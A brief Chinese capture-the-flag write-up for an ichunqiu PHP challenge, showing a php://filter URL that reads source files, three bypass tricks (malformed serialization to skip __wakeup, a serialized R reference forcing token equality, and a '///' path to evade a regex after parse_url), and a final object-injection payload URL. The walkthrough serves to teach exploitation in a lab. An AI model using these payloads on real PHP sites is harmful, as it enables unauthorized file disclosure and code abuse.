http://de4acedff28d48cea2954306dabe3d3276d73be89c7c4e2d.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=hint.php

伪协议拿到源码

Index.php里面得知hint.php

继续拿hint源码

发现构成反序列化的过程中有三个问题：

1.wakeup里面的属性清空：使用不正确的序列化对象可以避免wakeup的执行

2.getFlag函数里面的===，使用指针R，让token和token_flag始终相等

3.index里面的parse_url后的正则，使用///绕过

最终payload：

```
http://e5095d0258044ac28d26444770f6c4a04f5be24e59c54a3e.changame.ichunqiu.com///index.php?file=hint.php\&payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;s:32:%2251311013e51adebc3c34d2cc591fefee%22;s:10:%22token_flag%22;R:4;}}
```

